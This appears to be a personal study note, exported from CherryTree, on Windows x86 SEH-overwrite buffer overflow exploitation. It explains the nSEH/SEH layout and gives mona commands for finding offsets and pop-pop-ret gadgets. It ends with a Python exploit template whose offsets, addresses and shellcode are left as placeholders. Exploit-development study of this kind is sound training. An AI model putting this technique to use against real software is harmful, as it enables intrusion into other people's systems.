<!doctype html>
<html>
<head>
  <meta http-equiv="content-type" content="text/html; charset=utf-8">
  <title>SEH</title>
  <meta name="generator" content="CherryTree">
  <link rel="stylesheet" href="res/styles3.css" type="text/css" />
</head>
<body>
<div class='page'><strong><h1># Windows - x86 - Bypassing Protections - SEH</h1></strong><br />When an exception occurs, the Exception Handler will push the nodes of the linked list to the stack - nSEH and SEH. <br />The next SE handler will be at ESP+4, and the current SEH Record will be at ESP+8.<br /><br />nSEH = ESP+4<br />SEH   = ESP+8<br /><br />To abuse SEH, you simply overflow the buffer and overwrite SEH as well.<br />Overwrite the current SEH record [SEH] with a <code>pop; pop; ret</code> instruction, which returns you to [nSEH], and then overwrite the pointer to the next SE Handler [nSEH] with the address of your shellcode.<br /><br />Your payload will look like this:<br /><code>payload = overflow +        nSEH       +     SEH     + shellcode + padding</code><br /><code>payload = overflow + shellcode_address + pop;pop;ret + shellcode + padding</code><br /><br /><strong><h2>## How-to</h2></strong><br /><strong>1. Overflow buffer and crash program</strong><br />   1) <code>!mona findmsp</code> to find the offset to your cyclic pattern<br />   2) <code>!mona seh</code> to find a <code>pop; pop; ret</code> instruction (try to keep it clean without offsets)<br /><strong>2. Create a payload that overwrites the current SEH Record pointer</strong><br />   - <code>payload = offset_to_SEH + &quot;B&quot;*4 + pop;pop;ret + &quot;D&quot;*4</code><br />   - this will overflow the buffer, overwrite the current SEH Record with pop;pop;ret, and crash at nSEH which will be BBBB<br />   - following BBBB at the time of the crash should be your <code>D</code>s, which is the space for your shellcode<br />   - pick an address in your <code>D</code>s to jump to and take note of how many NOPs you&#39;ll need<br /><strong>3. Write final payload</strong><br />   - <code>payload = overflow + shellcode_address + pop;pop;ret + NOPs + shellcode + padding</code><br /><br /><strong><h2>## Template</h2></strong><br /><div class="codebox"><div class="codebox">#!/usr/bin/env&nbsp;python<br />#&nbsp;Software:&nbsp;<br />#&nbsp;Exploit&nbsp;type:&nbsp;SEH<br />#&nbsp;Platform:&nbsp;<br />#&nbsp;Badchars:&nbsp;<br /><br />import&nbsp;struct<br /><br />#&nbsp;temp&nbsp;values&nbsp;for&nbsp;fuzzing<br />fuzz&nbsp;=&nbsp;&quot;A&quot;*2000<br />fuzzCyclic&nbsp;=&nbsp;&quot;&quot;<br /><br />#&nbsp;PAYLOAD<br />#&nbsp;-----------------------------------------------------------<br />offset_to_nSEH&nbsp;=&nbsp;&quot;A&quot;&nbsp;*&nbsp;0<br />nSEH&nbsp;=&nbsp;struct.pack(&#39;&lt;I&#39;,&nbsp;0x42424242)&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;#&nbsp;address&nbsp;of&nbsp;shellcode<br />cSEH&nbsp;=&nbsp;struct.pack(&#39;&lt;I&#39;,&nbsp;&lt;POP&nbsp;POP&nbsp;RET&nbsp;address&gt;)&nbsp;#&nbsp;address&nbsp;of&nbsp;pop;&nbsp;pop;&nbsp;ret&nbsp;instruction<br />NOPs&nbsp;=&nbsp;&quot;\x90&quot;&nbsp;*&nbsp;0<br />padding&nbsp;=&nbsp;&quot;E&quot;&nbsp;*&nbsp;0<br /><br />#&nbsp;&lt;shellcode&nbsp;source/command&gt;<br />shellcode&nbsp;=&nbsp;&quot;&quot;<br /><br />payload&nbsp;=&nbsp;offset_to_nSEH&nbsp;+&nbsp;nSEH&nbsp;+&nbsp;cSEH&nbsp;+&nbsp;NOPs&nbsp;+&nbsp;shellcode&nbsp;+&nbsp;padding<br /><br />#&nbsp;EXPLOIT<br />#&nbsp;-----------------------------------------------------------<br />print&nbsp;payload</div></div><br /></div>
</body>
</html>
